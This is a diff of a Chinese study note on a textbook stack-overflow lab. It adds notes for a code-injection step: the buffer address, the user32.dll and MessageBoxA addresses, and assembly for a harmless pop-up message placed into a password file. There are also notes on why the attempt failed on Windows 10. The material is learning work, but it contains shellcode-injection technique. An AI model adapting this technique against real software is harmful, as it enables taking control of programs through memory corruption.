@@ -39,9 +39,36 @@ auth        00000000       00 00 00 00
 运行即可：
 ![success2](./success2.JPG)
 
-## 2.2.4 expriment
+## 2.2.4 expriment（代码植入）
+输入11组4321后的栈桢空间内容：  
+![buff](./buffaddr.JPG)  
+所以buffer的起始虚拟地址为0x0012FB7C。  
+接下来寻找user32.dll的base地址：
+![addr.jpg](./addr.JPG)
+可以看到，user32.dll的基地址为：0x77D10000，MessageBoxA的偏移为0x000407EA。所以MessageBoxA的虚拟地址为0x77D507EA。  
+然后是调用messagebox的汇编代码以及对应的机器码：
+```
+xor ebx,ebx
+push ebx
+push 74736577
+push 6C696166
+mov eax,esp
+push ebx
+push eax
+push eax
+push ebx
+mov eax,0x77D507EA
+call eax
+```
+机器码整理如下：
+![机器码](./shellcode.JPG)
+我们将上述的整理填入password.txt中，然后运行测试程序：
+![success3](./success3.JPG) 
+最后几个疑惑，留待以后解决：
+1. 本来使用win10做实验，使用dependencies计算user32.dll以及MessageboxA的相对偏移，buff区也调试出地址，可是最后运行程序总是会卡死，Ollydbg调试几番也未解决。 
+2. 这里的机器码的得出我本来是在win10下用汇编工具得出的，但是运行不对，也就是如同1中情况，使用书本给的机器码在winxp中实验后实验成功。
 
-0x0019FB2C->0x31323334
+至此第一篇第二章学习完毕。
 
-user32.dll的基地址：
+
 
